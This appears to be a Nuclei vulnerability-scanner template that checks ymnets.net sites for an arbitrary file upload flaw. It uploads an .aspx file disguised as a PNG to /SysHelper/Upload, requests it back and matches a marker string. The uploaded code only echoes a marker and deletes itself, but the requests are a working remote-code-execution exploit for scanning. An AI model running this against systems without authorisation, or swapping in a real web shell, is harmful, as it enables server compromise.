id: ymnets-net-upload-fileupload

info:
  name: ymnets-net-upload-fileupload
  author: XE
  severity: critical
  description: ymnets.net Upload 存在任意文件上传漏洞
  reference:
    - none
  tags: ymnets,fileupload

http:
  - raw:
      - |-
        POST /SysHelper/Upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX

        ------WebKitFormBoundaryu178FOm4XGgDZqeX
        Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
        Content-Type: image/png

        <%@Page Language="C#"%>
        <%
        Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
        System.IO.File.Delete(Request.PhysicalPath);
        %>
        ------WebKitFormBoundaryu178FOm4XGgDZqeX--
      
      - |-
        GET {{filename}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    extractors:
      - type: regex
        name: filename
        part: body_1
        internal: true
        group: 1
        regex:
          - "FilePath\":\"(.*)\""       

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"e165421110ba03099a1c0393373c5b43")